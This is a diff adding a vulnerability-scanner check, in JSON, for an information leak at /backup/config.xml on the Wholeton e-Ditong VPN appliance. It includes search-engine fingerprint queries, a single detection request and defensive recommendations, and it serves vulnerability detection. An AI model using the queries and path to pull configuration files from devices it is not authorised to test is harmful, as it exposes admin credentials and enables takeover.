@@ -1,0 +1,97 @@
+{
+  "Name": "Wheelon-e Ditong VPN infoformation leakage",
+  "Description": "<p></p >Wheelon-e Ditong VPN is a next-generation application-layer firewall hardware device, suitable for small and medium-sized enterprises. Wheelton-e Ditong VPN has information leakage in /backup/config.xml.<p></p >",
+  
+  "Product": "惠尔顿-e地通VPN",
+  "Homepage": "http://wholeton.com/",
+  "DisclosureDate": "2021-12-30",
+  "Author": "goodnight_meow@protonmail.com",
+  "FofaQuery": "app=\"惠尔顿-e地通VPN\"||body=\"e地通Socks5 VPN登录系统\"",
+  "GobyQuery": "app=\"惠尔顿-e地通VPN\"||body=\"e地通Socks5 VPN登录系统\"",
+  "Level": "2",
+  "Impact": "<p>Wheelton-e Ditong VPN has information leakage in /backup/config.xml. Attackers can use information leakage to obtain management account passwords, directly log in to the device, and other accounts, information, and configurations.</p >",
+  "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p ><p>2. If unnecessary, prohibit public access to the system. </p>",
+  "Translation": {
+    "CN": {
+	  "Name": "惠尔顿-e地通VPN信息泄露",
+      "VulType": [
+        "信息泄漏"
+      ],
+      "Tags": [
+        "信息泄漏"
+      ],
+      "Description": "<p><span style=\"font-size: medium;\">惠尔顿-e地通VPN是下一代的应用层防火墙硬件设备，适用于中小型企业。<span style=\"color: rgb(22, 51, 102); font-size: medium;\">惠尔顿-e地通VPN在</span>/backup/config.xml存在信息泄露。</span><br></p>",
+      "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: medium;\">惠尔顿-e地通VPN在</span><span style=\"color: rgb(22, 51, 102); font-size: medium;\">/backup/config.xml存在信息泄露。</span>攻击者可利用信息泄漏，获取管理账号密码，直接登录设备，以及其它账号、信息、配置等。<br></p>",
+      "Product": "Wheeler_e_VPN",
+      "Recommendation": "<p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。<br></p>"
+    }
+  },
+  "References": [
+    "https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=1820"
+  ],
+  "Is0day": false,
+  "HasExp": false,
+  "ExpParams": [],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/backup/config.xml",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "config",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": [
+    "info leak"
+  ],
+  "VulType": [
+    "info leak"
+  ],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "5.5",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
